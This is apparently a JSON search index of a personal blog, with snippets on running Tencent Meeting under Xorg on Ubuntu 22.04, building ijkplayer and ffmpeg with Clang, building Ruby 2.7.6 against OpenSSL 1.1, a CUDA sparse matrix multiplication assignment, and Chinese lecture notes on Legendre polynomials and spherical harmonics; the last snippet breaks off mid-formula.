[ { "title": "Run Tencent Meeting on Ubuntu 22.04", "url": "/development-environment/2022/07/20/run-tencent-meeting-on-ubuntu-22.04/", "categories": "Development Environment", "tags": "Ubuntu, Ubuntu 22.04, Tencent Meeting", "date": "2022-07-20 00:00:00 +0800", "snippet": "Environment Name Value OS Ubuntu 22.04 LTS Tencent Meeting 3.9.0.1 2022-07-20 Problem检测到窗口系统采用wayland协议，腾讯会议暂不兼容，程序即将退出！SolutionLogin with Ubuntu on XorgTo login to Ubuntu 22.04 using Xorg click on the gear button and select Ubuntu on Xorg option before you login.Disable Wayland1Step 1The default display manager for the GNOME desktop environment is GDM3. Therefore, we will edit the /etc/gdm3/custom.conf file to either disable or enable Wayland. Open a command line terminal and use nano or your favorite text editor to open this file with root permissions.$ sudo vim /etc/gdm3/custom.confStep 2Within this file, look for the line that says #WaylandEnable=false. You can uncomment this line and either set it to true or false, depending on whether you want Wayland enabled or not.Enable WaylandWaylandEnable=trueDisable WaylandWaylandEnable=falseStep 3After you have made the desired changes, save this file and exit it. You will need to restart GDM3 or reboot your Ubuntu 22.04 desktop for the changes to take effect.$ sudo systemctl restart gdm3Reference How to enable/disable wayland on Ubuntu 22.04 Desktop - Linux Tutorials - Learn Linux Configuration &#8617; " }, { "title": "Build ijkplayer with Clang", "url": "/android/2022/07/16/build-ijkplayer-with-clang/", "categories": "Android", "tags": "OSLAB, Android, Java, Clang", "date": "2022-07-16 00:00:00 +0800", "snippet": "How to Build ijkplayerBefore Build Download NDK: Unsupported Downloads · android/ndk Wiki Download Android Studio: Android Studio download archives | Android DevelopersConfigure Environmentexport ANDROID_SDK=~/Android/Sdkexport ANDROID_NDK=~/programs/ndk/r14bBuildIf no argument is pass to compile-ffmpeg.sh and compile-ijk.sh, only armv7a target will be build instead of all targets including armv5, armv7a, arm64, x86, x86_64../init-android.sh# build ffmpegcd android/contrib./compile-ffmpeg.sh clean./compile-ffmpeg.sh # compile armv7a only# build ijkplayercd .../compile-ijk.sh clean./compile-ijk.sh # compile armv7a only# Android Studio:# Select android/ijkplayer/ and importBuild ffmpeg with Clangcompile-ffmpeg.sh calls tools/do-compile-ffmpeg.sh to do the real compilation job, thus the main build process is present in tools/do-compile-ffmpeg.sh.Make NDK Standalone Toolchaindo-compile-ffmpeg.sh calls $ANDROID_NDK/build/tools/make-standalone-toolchain.sh to make toolchain on line 202. make-standalone-toolchain.sh then calls $ANDROID_NDK/build/tools/make-standalone-toolchain.py to install toolchain under android/contrib/build/ffmpeg-armv7a/toolchain/.Under android/contrib/build/ffmpeg-armv7a/toolchain/bin/, you will find clang, clang38, arm-linux-androideabi-clang. clang and arm-linux-androideabi-clang are identical, both of which are shell script wrapper ( see below ) for clang38, a binary program.#!/bin/bashif [ \"$1\" != \"-cc1\" ]; then `dirname $0`/clang38 -target armv7a-none-linux-androideabi --sysroot `dirname $0`/../sysroot \"$@\"else # target/triple already spelled out. `dirname $0`/clang38 \"$@\"ficlang38 is directly copied from $ANDROID_NDK. In the python script make-standalone-toolchain.py, we can find the following function on line 133:def get_clang_path_or_die(host_tag): \"\"\"Return the Clang path for our host or die.\"\"\" clang_toolchain_path = os.path.join( NDK_DIR, 'toolchains/llvm/prebuilt', host_tag) if not os.path.exists(clang_toolchain_path): sys.exit('Could not find Clang: {}'.format(clang_toolchain_path)) return clang_toolchain_pathThat is to say, clang38 probably comes from $ANDROID_NDK/toolchains/llvm/prebuilt/linux-x86_64/. And in fact, that's true! If we compare clang38 and $ANDROID_NDK/toolchains/llvm/prebuilt/clang:cmp $ANDROID_NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/clang android/contrib/build/ffmpeg-armv7a/toolchain/bin/clang38 The two compilers are identical!configurate ffmpegThis step is quite short in do-compile-ffmpeg.sh, staring from line 300:cd $FF_SOURCEif [ -f \"./config.h\" ]; then echo 'reuse configure'else which $CC ./configure $FF_CFG_FLAGS \\ --extra-cflags=\"$FF_CFLAGS $FF_EXTRA_CFLAGS\" \\ --extra-ldflags=\"$FF_DEP_LIBS $FF_EXTRA_LDFLAGS\" make cleanficonfigure is a bash script under android/contrib/ffmpeg-armv7a/. Help messages can be found in function show_help() on line 59. Toolchain options starts from line 331. By default, arm-linux-androideabi-gcc is used as C compiler ( $cc ). To use clang, we need to pass --cc=clang or --cc=arm-linux-androideabi-clang to ./configure. The two clang wrapper are identical.--- a/android/contrib/tools/do-compile-ffmpeg.sh+++ b/android/contrib/tools/do-compile-ffmpeg.sh@@ -214,7 +214,7 @@ echo \"[*] check ffmpeg env\" echo \"--------------------\" export PATH=$FF_TOOLCHAIN_PATH/bin/:$PATH #export CC=\"ccache ${FF_CROSS_PREFIX}-gcc\"-export CC=\"${FF_CROSS_PREFIX}-gcc\"+export CC=\"${FF_CROSS_PREFIX}-clang\" export LD=${FF_CROSS_PREFIX}-ld export AR=${FF_CROSS_PREFIX}-ar export STRIP=${FF_CROSS_PREFIX}-strip@@ -303,6 +303,8 @@ if [ -f \"./config.h\" ]; then else which $CC ./configure $FF_CFG_FLAGS \\+ --cc='clang' \\+ --host-cc='clang38' \\ --extra-cflags=\"$FF_CFLAGS $FF_EXTRA_CFLAGS\" \\ --extra-ldflags=\"$FF_DEP_LIBS $FF_EXTRA_LDFLAGS\" make cleanHowever, you would probably get an error message like this:GNU assembler not found, install/update gas-preprocessorHere is the reason. By default, ./configure uses $cc as the assembler ( $as ). However, Clang 3.8 is somewhat incompatible with GNU when it comes to assembly code. Even if I skip the assembler test ( function check_as() ) in configure, it will fail when compiling.One possible solution is to add -fno-integrated-as to Clang flags.1+ --cc='clang -fno-integrated-as' \\Or, explicitly tell configure to use gcc as assembler:+ --as='arm-linux-androideabi-gcc' \\+ --cc='clang' \\ It works!Suppress WarningsClang generates lots of warnings. To suppress them, add the following flags to Clang flags.Suppress \"deprecated declarations\"Add -Wno-deprecated-declarations to Clang flags.Suppress \"unknown warning option\"Add -Wno-unknown-warning-option to Clang flags.Suppress \"unused function\"Add -Wno-unused-function to Clang flags. I tried to add the flag directly in do-compile-ffmpeg.sh as following, but didn't work. Perhaps -Wunused-function is added back somewhere else in configure.--- a/android/contrib/tools/do-compile-ffmpeg.sh+++ b/android/contrib/tools/do-compile-ffmpeg.sh@@ -214,7 +214,7 @@ echo \"[*] check ffmpeg env\" echo \"--------------------\" export PATH=$FF_TOOLCHAIN_PATH/bin/:$PATH #export CC=\"ccache ${FF_CROSS_PREFIX}-gcc\"-export CC=\"${FF_CROSS_PREFIX}-gcc\"+export CC=\"${FF_CROSS_PREFIX}-clang\" export LD=${FF_CROSS_PREFIX}-ld export AR=${FF_CROSS_PREFIX}-ar export STRIP=${FF_CROSS_PREFIX}-strip@@ -303,6 +303,8 @@ if [ -f \"./config.h\" ]; then else which $CC ./configure $FF_CFG_FLAGS \\+ --cc='clang -fno-integrated-as -Wno-deprecated-declarations -Wno-unknown-warning-option -Wno-unused-function' \\+ --host-cc='clang38' \\ --extra-cflags=\"$FF_CFLAGS $FF_EXTRA_CFLAGS\" \\ --extra-ldflags=\"$FF_DEP_LIBS $FF_EXTRA_LDFLAGS\" make cleanUpgrade Clang to Higher VersionThe version of Clang which NDK r14b uses is 3.8. It's a little bit old. I failed to compile ffmpeg with NDK r15 or higher. Instead, I find a tricky method to use later version of Clang.As mentioned in the previous, the Clang used to compile ffmpeg comes from NDK toolchain. If we replace the Clang in NDK, we may be able to use a different version of Clang. NDK r25 comes with Clang 14, so I can:(base) liblaf@xps:~/programs/ndk/r14b/toolchains/llvm/prebuilt/linux-x86_64/bin$ mv clang clang.old # backup clang(base) liblaf@xps:~/programs/ndk/r14b/toolchains/llvm/prebuilt/linux-x86_64/bin$ ln --symbolic ~/programs/ndk/r25/toolchains/llvm/prebuilt/linux-x86_64/bin/clang clang # link clang in NDK r14 to clang in NDK r25 Do Not Copy! That won't work! Link Instead!Even better, Clang 14 is compatible with GNU assembler, so -fno-integrated-as is unnecessary any more.Compatibility Test SDK NDK Gradle Android Studio compile ffmpeg compile ijk Emulator 25.0.3 r10e 2.14.1 2.3.2 :white_check_mark: :white_check_mark: :white_check_mark: 25.0.3 r11c 2.14.1 2.3.2 :white_check_mark: :white_check_mark: :white_check_mark: 25.0.3 r12b 2.14.1 2.3.2 :white_check_mark: :white_check_mark: :white_check_mark: 25.0.3 r13b 2.14.1 2.3.2 :white_check_mark: :white_check_mark: :white_check_mark: 25.0.3 r14b 2.14.1 2.3.2 :o: :white_check_mark: :white_check_mark: 25.0.3 r15c 2.14.1 2.3.2 :x:     28.0.3 r14b 2.14.1 3.6.3 :white_check_mark: :x:   When building with NDK r14b, you may encounter an error like this:BFD: libncurses.so.5: cannot open shared object file: No such file or directoryThe solution is to install the corresponding dependency:2sudo apt install libncurses5Discussion on GitHubHere are some discussions on GitHub. I tried some of their methods but it didn't work. 编译出错 · Issue #3378 · bilibili/ijkplayer You need the NDKr10e or later · Issue #2752 · bilibili/ijkplayerReference c - Unknown directive .altmacro error happens when using android-ndk standalone toolchain - Stack Overflow &#8617; linux - error while loading shared libraries: libncurses.so.5: - Stack Overflow &#8617; " }, { "title": "Failed To Build Ruby 2.7.6 on Ubuntu 22.04", "url": "/development-environment/2022/07/14/failed-to-build-ruby-2.7.6-on-ubuntu-22.04/", "categories": "Development Environment", "tags": "Ruby, rbenv, Ubuntu, Ubuntu 22.04, Homebrew", "date": "2022-07-14 00:00:00 +0800", "snippet": "Environment Name Value OS Ubuntu 22.04 LTS rbenv --version rbenv 1.2.0 brew --version Homebrew 3.5.4 ProblemWhen trying to install ruby 2.7.6 using rbenv install 2.7.6Downloading ruby-2.7.6.tar.bz2...-&gt; https://cache.ruby-lang.org/pub/ruby/2.7/ruby-2.7.6.tar.bz2Installing ruby-2.7.6...ruby-build: using readline from homebrewBUILD FAILED (Ubuntu 22.04 using ruby-build 20220713)Inspect or clean up the working tree at /tmp/ruby-build.20220716222955.76271.nA4cijResults logged to /tmp/ruby-build.20220716222955.76271.logLast 10 log lines:\tfrom /tmp/ruby-build.20220716222955.76271.nA4cij/ruby-2.7.6/lib/rubygems/core_ext/kernel_require.rb:83:in `require'\tfrom /tmp/ruby-build.20220716222955.76271.nA4cij/ruby-2.7.6/lib/rubygems/package.rb:44:in `&lt;top (required)&gt;'\tfrom /tmp/ruby-build.20220716222955.76271.nA4cij/ruby-2.7.6/lib/rubygems/core_ext/kernel_require.rb:83:in `require'\tfrom /tmp/ruby-build.20220716222955.76271.nA4cij/ruby-2.7.6/lib/rubygems/core_ext/kernel_require.rb:83:in `require'\tfrom /tmp/ruby-build.20220716222955.76271.nA4cij/ruby-2.7.6/lib/rubygems/installer.rb:11:in `&lt;top (required)&gt;'\tfrom /tmp/ruby-build.20220716222955.76271.nA4cij/ruby-2.7.6/lib/rubygems/core_ext/kernel_require.rb:83:in `require'\tfrom /tmp/ruby-build.20220716222955.76271.nA4cij/ruby-2.7.6/lib/rubygems/core_ext/kernel_require.rb:83:in `require'\tfrom ./tool/rbinstall.rb:713:in `&lt;module:RbInstall&gt;'\tfrom ./tool/rbinstall.rb:649:in `&lt;main&gt;'make: *** [uncommon.mk:373: do-install-all] Error 1Reason Unfortunately, Ubuntu 22.04 only provide OpenSSL 3.0. And The supported version of OpenSSL 3.0 are only Ruby 3.1.1Solution @wheatley @stuffa Based on this information, I would think that the safest way to build Ruby on Ubuntu 22.04 would be: instead of depending on the system libssl-dev package, download and compile OpenSSL 1.1.1 into its own directory, then point to that directory with RUBY_CONFIGURE_OPTS=--with-openssl-dir=/path/to/my/openssl while compiling with ruby-build.2 I had installed rbenv with homebrew (on ubuntu 22.04), and it turns out openssl 1.1.1n was already present through homebrew after that, as I could see by running openssl version and which openssl.3If necessary, fetch dependencies:sudo apt install zlib1g-devThenRUBY_CONFIGURE_OPTS=--with-openssl-dir=/home/linuxbrew/.linuxbrew/opt/openssl@1.1 rbenv install 2.7.6Reference https://github.com/rbenv/ruby-build/discussions/1940#discussioncomment-2519546 &#8617; https://github.com/rbenv/ruby-build/discussions/1940#discussioncomment-2552849 &#8617; https://github.com/rbenv/ruby-build/discussions/1940#discussioncomment-2706874 &#8617; " }, { "title": "PA4: 稀疏矩阵-矩阵乘", "url": "/course-work/introduction-to-high-performance-computing/2022/06/21/pa4-%E7%A8%80%E7%96%8F%E7%9F%A9%E9%98%B5-%E7%9F%A9%E9%98%B5%E4%B9%98/", "categories": "Course Work, Introduction to High Performance Computing", "tags": "HPC, CUDA, SpMM", "date": "2022-06-21 00:00:00 +0800", "snippet": "优化策略warp divergenceref 实现中的 warp divergence 主要是因为将不同行归入一个 warp 计算, 而不同行的 NNZ 可能有很大差异, 产生 warp divergence. 因此, 只要避免将不同行划入同一 warp 即可. 因此, 令 block.x = 1, 使每个 thread block 至多处理一行数据.如图中 ref 与 phase_1 对比, 提升有限.shared memory在 SpMM 中, 稀疏矩阵的一个元素代表了对于稠密矩阵的一行的访问. 因此可以将稀疏矩阵的一部分缓存在 shared memory 中, 以减少重复从 global memory 中读取稀疏矩阵.如图中 phase_2, 效果拔群.load imbalance稀疏矩阵不同行的 NNZ 可能有很大差异, 因此考虑将较大的行进一步划分, 将稀疏矩阵的一行分割为多个 Task, 分配到多个线程中处理, 再使用 atomicAdd 归约. 为了减少同一行被连续线程处理导致 atomic 冲突频繁, 我们可以将 Task 打乱.如图中 opt, 获得了进一步提升.PerformancekLen = 32 Dataset ref time opt time speedup arxiv 0.000772655 0.000382011 2.0225988256882657 collab 0.00133105 0.000747854 1.7798260088199034 citation 0.0164488 0.0109764 1.4985605480849822 ddi 0.000705377 0.000233554 3.0201880507291676 protein 0.0246445 0.0136007 1.8120023234098244 ppa 0.0183861 0.0103118 1.783015574390504 reddit.dgl 0.0486643 0.0211276 2.303352013479998 products 0.0558278 0.0334461 1.669187139905699 youtube 0.00364472 0.00274129 1.3295638184942127 amazon_cogdl 0.125264 0.0522025 2.399578564245007 yelp 0.00658028 0.00378241 1.7397056374110687 wikikg2 0.00714436 0.00485393 1.4718712465981172 am 0.00374 0.00226176 1.6535795132993776 kLen = 256 Dataset ref time opt time speedup arxiv 0.0030007 0.00297216 1.0096024440137812 collab 0.00520226 0.00587065 0.8861471898341752 citation 0.0788706 0.119014 0.6627001865326768 ddi 0.00156062 0.00159544 0.978175299603871 protein 0.0808061 0.112618 0.7175238416594151 ppa 0.0849794 0.0839621 1.0121161809911854 reddit.dgl 0.202341 0.174222 1.1613975272927644 products 0.258469 0.274967 0.9400000727360011 youtube 0.0144181 0.0220068 0.6551656760637621 amazon_cogdl 0.517086 0.424054 1.2193871535229006 yelp 0.029976 0.0305569 0.980989563731923 wikikg2 0.0166503 0.0387169 0.4300525093692935 am 0.0134264 0.0182773 0.7345942781483041 " }, { "title": "第十四章 球函数", "url": "/course-notes/mathematical-physics-equations/2022/06/08/%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0-%E7%90%83%E5%87%BD%E6%95%B0/", "categories": "Course Notes, Mathematical Physics Equations", "tags": "untagged", "date": "2022-06-08 00:00:00 +0800", "snippet": "Legendre 方程和连带 Legendre 方程Helmholtz 方程在球坐标系下分离变量, 即可得连带 Legendre 方程$\\frac{1}{\\sin\\theta} \\dv{\\theta}(\\sin\\theta \\dv{\\Theta}{\\theta}) + \\qty(\\lambda - \\frac{\\mu}{\\sin[2]{\\theta}}) \\Theta = 0\\nonumber$以及它的特殊情形, Legendre 方程$\\frac{1}{\\sin\\theta} \\dv{\\theta}(\\sin\\theta \\dv{\\Theta}{\\theta}) + \\lambda \\Theta = 0,\\nonumber$做变换 $x = \\cos\\theta$, $y\\qty(x) = \\Theta\\qty(\\theta)$, 则又可将它们改写成$\\dv{x}\\qty[\\qty(1 - x^2) \\dv{y}{x}] + \\qty(\\lambda - \\frac{\\mu}{1 - x^2}) y = 0\\nonumber$和$\\dv{x}\\qty[\\qty(1 - x^2) \\dv{y}{x}] + \\lambda y = 0.\\nonumber$Legendre 多项式本征值问题$\\begin{gather} \\dv{x}\\qty[\\qty(1 - x^2) \\dv{y}{x}] + \\lambda y = 0, \\tag{1a} \\label{eq-14-1a} \\\\ y\\qty(\\pm 1) ~ \\text{有界} \\tag{1b} \\label{eq-14-1b}\\end{gather}$的解是$\\begin{align} & \\text{本征值} & & \\lambda_l = l \\qty(l + 1), & & l = 0, 1, 2, \\dots, \\tag{2a} \\label{eq-14-2a} \\\\ & \\text{本征函数} & & y_l\\qty(x) = \\mathrm{P}_l\\qty(x). \\tag{2b} \\label{eq-14-2b}\\end{align}$$\\mathrm{P}_l\\qty(x)$ 称为 $l$ 次 Legendre 多项式,$\\begin{align} \\mathrm{P}_l\\qty(x) & = \\sum_{n = 0}^l \\frac{1}{\\qty(n!)^2} \\frac{\\qty(l + n)!}{\\qty(l - n)!} \\qty(\\frac{x - 1}{2})^n \\tag{3} \\label{eq-14-3} \\\\ & = \\sum_{r = 0}^{\\qty[l / 2]} \\qty(-1)^r \\frac{l!}{r! \\qty(l - r)!} \\frac{\\qty(2 l - 2 r)!}{\\qty(l - 2 r)!} x^{l - 2 r}. \\tag{4} \\label{eq-14-4}\\end{align}$Legendre 多项式的主要性质微分表示 (Rodrigues 公式)$$\\begin{equation} \\mathrm{P}_l\\qty(x) = \\frac{1}{2^l l!} \\dv[l]{x}(x^2 - 1)^l. \\tag{5} \\label{eq-14-5}\\end{equation}$$生成函数Legendre 多项式的生成函数是 $1 / \\sqrt{1 - 2 x t + t^2}$,$\\begin{equation} \\frac{1}{\\sqrt{1 - 2 x t + t^2}} = \\sum_{t = 0}^{\\infty} \\mathrm{P}_l\\pqty{x} t^l \\qc \\vqty{v} 规定多值函数 $1 / \\sqrt{- 2 x t + t^2}$ 的单值分枝为 $\\eval{\\frac{1}{\\sqrt{1 - 2 x t + t^2}}}_{t = 0} = 1$.递推关系Legendre 多项式的主要递推关系有$\\begin{align} & \\qty(2 l + 1) x \\mathrm{P}_l\\qty(x) = \\qty(l + 1) \\mathrm{P}_{l + 1}\\qty(x) + l \\mathrm{P}_{l - 1} \\qty(x), \\tag{7} \\label{eq-14-7} \\\\ & \\mathrm{P}_l\\qty(x) = \\mathrm{P}_{l + 1}'\\qty(x) - 2 x \\mathrm{P}_l'\\qty(x) + \\mathrm{P}_{l - 1}'\\qty(x), \\tag{8} \\label{eq-14-8} \\\\ & \\mathrm{P}_{l + 1}'\\qty(x) = x \\mathrm{P}_l'\\qty(x) + \\qty(l + 1) \\mathrm{P}_l\\qty(x), \\tag{9} \\label{eq-14-9} \\\\ & \\mathrm{P}_{l - 1}'\\qty(x) = x \\mathrm{P}_l'\\qty(x) - l \\mathrm{P}_l\\qty(x), \\tag{10} \\label{eq-14-10} \\\\ & \\mathrm{P}_{l + 1}'\\qty(x) - \\mathrm{P}_{l - 1}'\\qty(x) = \\qty(2 l + 1) \\mathrm{P}_l\\qty(x). \\tag{11} \\label{eq-14-11}\\end{align}$把这些递推关系重新组合, 还能给出其他形式的递推关系.正交完备性正交性不同次数的 Legendre 多项式在区间 $\\comm{-1}{1}$ 上正交,$\\begin{equation} \\int_{-1}^1 \\mathrm{P}_l\\qty(x) \\mathrm{P}_k\\qty(x) \\dd{x} = 0 \\qc k \\neq l. \\tag{12} \\label{eq-14-12}\\end{equation}$Legendre 多项式的模方$$\\begin{equation} \\int_{-1}^1 \\mathrm{P}_l\\qty(x) \\mathrm{P}_l\\qty(x) \\dd{x} = \\frac{2}{2 l + 1}. \\tag{13} \\label{eq-14-13}\\end{equation}$$把 $\\eqref{eq-14-12}$ 和 $\\eqref{eq-14-13}$ 合并起来, 还可以写成$\\begin{equation} \\int_{-1}^1 \\mathrm{P}_k\\qty(x) \\mathrm{P}_l\\qty(x) \\dd{x} = \\frac{2}{2 l + 1} \\delta_{k l}, \\tag{14} \\label{eq-14-14}\\end{equation}$其中 $\\delta_{i j}$ 是 Kronecker 的 $\\delta$ 符号.通过变换 $x = \\cos\\theta$ 变回到以 $\\theta$ 为自变量, $\\eqref{eq-14-14}$ 就变为$\\begin{equation} \\int_0^{\\pi} \\mathrm{P}_k\\qty(\\cos\\theta) \\mathrm{P}_l\\qty(\\cos\\theta) \\sin\\theta \\dd{\\theta} = \\frac{2}{2 l + 1} \\delta_{kl}, \\tag{14'} \\label{eq-14-14'}\\end{equation}$即 $\\mathrm{P}_k\\qty(\\cos\\theta)$ 和 $\\mathrm{P}_l\\qty(\\cos\\theta)$ 在区间 $\\comm{0}{\\pi}$ 上以权函数 $\\sin\\theta$ 正交. 权函数 $\\sin\\theta$ 正好就是微分方程$\\dv{\\theta}(\\sin\\theta \\dv{\\Theta}{\\theta}) + \\lambda \\sin\\theta \\Theta = 0\\nonumber$中本征值 $\\lambda$ 后的函数 $\\sin\\theta$.Legendre 多项式的完备性任意一个在区间 $\\comm{-1}{1}$ 中分段连续的函数 $f\\qty(x)$, (在平均收敛意义下) 可以展开为级数$\\begin{equation} f\\qty(x) = \\sum_{l = 0}^{\\infty} c_l \\mathrm{P}_l\\qty(x), \\tag{15} \\label{eq-14-15}\\end{equation}$其中的展开系数 $c_l$ 可以根据 Legendre 多项式的正交性求得$\\begin{equation} c_l = \\frac{2 l + 1}{2} \\int_{-1}^1 f\\qty(x) \\mathrm{P}_l\\qty(x) \\dd{x}. \\tag{16} \\label{eq-14-16}\\end{equation}$连带 Legendre 函数本征值问题$\\begin{align} & \\dv{x}\\qty[\\qty(1 - x^2) \\dv{y}{x}] + \\qty(\\lambda - \\frac{m^2}{1 - x^2}) y = 0, & & m = 0, 1, 2, \\dots, \\tag{17a} \\label{eq-14-17a} \\\\ & y\\qty(\\pm 1) ~ \\text{有界} \\tag{17b} \\label{eq-14-17b}\\end{align}$的解是$\\begin{align} & \\text{本征值} & & \\lambda_l = l \\qty(l + 1), & & l = m, m + 1, m + 2, \\dots, \\tag{18a} \\label{eq-14-18a} \\\\ & \\text{本征函数} & & y_l\\qty(x) = \\mathrm{P}_l^m\\qty(x). \\tag{18b} \\label{eq-14-18b}\\end{align}$$\\mathrm{P}_l^m\\qty(x)$ 称为 $m$ 阶 $l$ 次连带 Legendre 函数,$\\begin{equation} \\mathrm{P}_l^m\\qty(x) \\equiv \\qty(-1)^m \\qty(1 - x^2)^{m / 2} \\dv[m]{\\mathrm{P}_l\\qty(x)}{x}. \\tag{19} \\label{eq-14-19}\\end{equation}$球面调和函数定义球面调和函数来自本征值问题$\\begin{equation} \\frac{1}{\\sin\\theta} \\pdv{\\theta}\\qty[\\sin\\theta \\pdv{S\\qty(\\theta, \\phi)}{\\theta}] + \\frac{1}{\\sin[2]{\\theta}} \\pdv[2]{S\\qty(\\theta, \\phi)}{\\phi} + \\lambda S\\qty(\\theta, \\phi) = 0, \\tag{20a} \\label{eq-14-20a}\\end{equation}$$$\\begin{align} & \\eval{S}_{\\theta = 0} ~ \\text{有界}, & & \\eval{S}_{\\theta = \\pi} ~ \\text{有界}, \\tag{20b} \\label{eq-14-20b} \\\\ & \\eval{S}_{\\phi = 0} = \\eval{S}_{\\phi = 2 \\pi}, & & \\eval{\\pdv{S}{\\phi}}_{\\phi = 0} = \\eval{\\pdv{S}{\\phi}}_{\\phi = 2 \\pi}. \\tag{20c} \\label{eq-14-20c}\\end{align}$$此本征值问题的本征值为$\\begin{equation} \\lambda_l = l \\qty(l + 1) \\qc l = 0, 1, 2, 3, \\dots; \\tag{21} \\label{eq-14-21}\\end{equation}$而对应于一个本征值 $\\lambda_l$, 有 $2 l + 1$ 个本征函数 ($2 l + 1$ 度简并)$\\begin{align} & S_{lm1}\\qty(\\theta, \\phi) = \\mathrm{P}_l^m\\qty(\\cos\\theta) \\cos{m \\phi}, & & m = 0, 1, 2, \\dots, l \\tag{22a} \\label{eq-14-22a} \\\\ & S_{lm2}\\qty(\\theta, \\phi) = \\mathrm{P}_l^m\\qty(\\cos\\theta) \\sin{m \\phi}, & & m = 1, 2, \\dots, l. \\tag{22b} \\label{eq-14-22b}\\end{align}$或者组合成$\\begin{equation} S_{lm}\\qty(\\theta, \\phi) = \\mathrm{P}_l^m\\qty(\\cos\\theta) e^{i m \\phi} \\qc m = 0, \\pm 1, \\pm 2, \\dots, \\pm l, \\tag{22c} \\label{eq-14-22c}\\end{equation}$其中$\\mathrm{P}_l^{-m}\\qty(\\cos\\theta) = \\qty(-1)^m \\frac{\\qty(l - m)!}{\\qty(l + m)!} \\mathrm{P}_l^m\\qty(\\cos\\theta).\\nonumber$这些本征函数, 统称为球面调和函数, 或球谐函数.在此基础上, 就可以写出球内 Laplace 方程边值问题$\\begin{equation} \\frac{1}{r^2} \\pdv{r}(r^2 \\pdv{u}{r}) + \\frac{1}{r^2 \\sin\\theta} \\pdv{\\theta}(\\sin\\theta \\pdv{u}{\\theta}) + \\frac{1}{r^2 \\sin[2]{\\theta}} \\pdv[2]{u}{\\phi} = 0, \\tag{23a} \\label{eq-14-23a}\\end{equation}$$$\\begin{align} & \\eval{u}_{\\theta = 0} ~ \\text{有界}, & & \\eval{u}_{\\theta = \\pi} ~ \\text{有界}, \\tag{23b} \\label{eq-14-23b} \\\\ & \\eval{u}_{\\phi = 0} = \\eval{u}_{\\phi = 2 \\pi}, & & \\eval{\\pdv{u}{\\phi}}_{\\phi = 0} = \\eval{\\pdv{u}{\\phi}}_{\\phi = 2 \\pi}, \\tag{23c} \\label{eq-14-23c} \\\\ & \\eval{u}_{r = 0} ~ \\text{有界}, & & \\eval{u}_{r = a} = f\\qty(\\theta, \\phi) \\tag{23d} \\label{eq-14-23d}\\end{align}$$的一般解$u\\qty(r, \\theta, \\phi) = \\sum_{l = 0}^{\\infty} \\sum_{m = 0}^l r^l \\mathrm{P}_l\\qty(\\cos\\theta) \\qty(A_{lm} \\cos{m \\phi} + B_{lm} \\sin{m \\phi}).\\nonumber$正交性$l$ 或 $m$ 不同的球面调和函数在整个 $4 \\pi$ 立体角上彼此正交, 即当 $\\qty(l, m) \\neq \\qty(k, n)$ 时, 有$\\begin{gather} \\int_0^{\\pi} \\mathrm{P}_l^m\\qty(\\cos\\theta) \\mathrm{P}_k^n\\qty(\\cos\\theta) \\sin\\theta \\dd{\\theta} \\int_0^{2 \\pi} \\cos{m \\phi} \\cos{n \\phi} \\dd{\\phi} = 0, \\tag{24a} \\label{eq-14-24a} \\\\ \\int_0^{\\pi} \\mathrm{P}_l^m\\qty(\\cos\\theta) \\mathrm{P}_k^n\\qty(\\cos\\theta) \\sin\\theta \\dd{\\theta} \\int_0^{2 \\pi} \\sin{m \\phi} \\sin{n \\phi} \\dd{\\phi} = 0, \\tag{24b} \\label{eq-14-24b} \\\\ \\int_0^{\\pi} \\mathrm{P}_l^m\\qty(\\cos\\theta) \\mathrm{P}_k^n\\qty(\\cos\\theta) \\sin\\theta \\dd{\\theta} \\int_0^{2 \\pi} \\cos{m \\phi} \\sin{n \\phi} \\dd{\\phi} = 0. \\tag{24c} \\label{eq-14-24c}\\end{gather}$球面调和函数的模方$$\\begin{align} & \\int_0^{\\pi} \\qty[\\mathrm{P}_l^m\\qty(\\cos\\theta)]^2 \\sin\\theta \\dd\\theta \\int_0^{2 \\pi} \\cos[2]{m \\phi} \\dd\\phi = \\frac{\\qty(l + m)!}{\\qty(l - m)!} \\frac{2 \\pi}{2 l + 1} \\qty(1 + \\delta_{m0}), \\tag{25a} \\label{eq-14-25a} \\\\ & \\int_0^{\\pi} \\qty[\\mathrm{P}_l^m\\qty(\\cos\\theta)]^2 \\sin\\theta \\dd\\theta \\int_0^{2 \\pi} \\sin[2]{m \\phi} \\dd\\phi = \\frac{\\qty(l + m)!}{\\qty(l - m)!} \\frac{2 \\pi}{2 l + 1}. \\tag{25b} \\label{eq-14-25b}\\end{align}$$(归一化的) 球面调和函数$$\\begin{equation} \\mathrm{Y}_l^m\\pqty{\\theta, \\phi} = \\sqrt{\\frac{\\pqty{l - \\vqty{m}}!}{\\pqty{l + \\vqty{m}}!} \\frac{2 l + 1}{4 \\pi}} \\mathrm{P}_l^{\\vqty{m}}\\pqty{\\cos\\theta} e^{i m \\phi} \\qc m = 0, \\pm 1, \\pm 2, \\dots, \\pm l. \\tag{26} \\label{eq-14-26}\\end{equation}$$相应的正交归一关系为$\\begin{equation} \\int_0^{\\pi} \\int_0^{2 \\pi} \\mathrm{Y}_l^m\\qty(\\theta, \\phi) \\mathrm{Y}_k^{n*}\\qty(\\theta, \\phi) \\sin\\theta \\dd{\\theta} \\dd{\\phi} = \\delta_{lk} \\delta_{mn}. \\tag{27} \\label{eq-14-27}\\end{equation}$" }, { "title": "第十六章 分离变量法总结", "url": "/course-notes/mathematical-physics-equations/2022/06/08/%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0-%E5%88%86%E7%A6%BB%E5%8F%98%E9%87%8F%E6%B3%95%E6%80%BB%E7%BB%93/", "categories": "Course Notes, Mathematical Physics Equations", "tags": "untagged", "date": "2022-06-08 00:00:00 +0800", "snippet": "伴算符与自伴算符1.设 $\\hat{L}$ 和 $\\hat{M}$ 为定义在一定函数空间内的线性 (微分) 算符, 若对于该函数空间内的任意函数 $u$ 和 $v$, 恒有$\\begin{equation} \\qty(v, \\hat{L} u) = \\qty(\\hat{M} v, u) \\qq{即} \\int_a^b v^* \\hat{L} u \\dd{x} = \\int_a^b \\qty(\\hat{M} v)^* u \\dd{x}, \\tag{1} \\label{eq-16-1}\\end{equation}$则称 $\\hat{M}$ 是 $\\hat{L}$ 的 伴算符.反之, $\\hat{L}$ 也是 $\\hat{M}$ 的伴算符.2.若算符 $\\hat{L}$ 的伴算符就是自身, 则称 $\\hat{L}$ 是 自伴算符. 这是有$\\begin{equation} \\qty(v, \\hat{L} u) = \\qty(\\hat{L} v, u) \\qq{即} \\int_a^b v^* \\hat{L} u \\dd{x} = \\int_a^b \\qty(\\hat{L} v)^* u 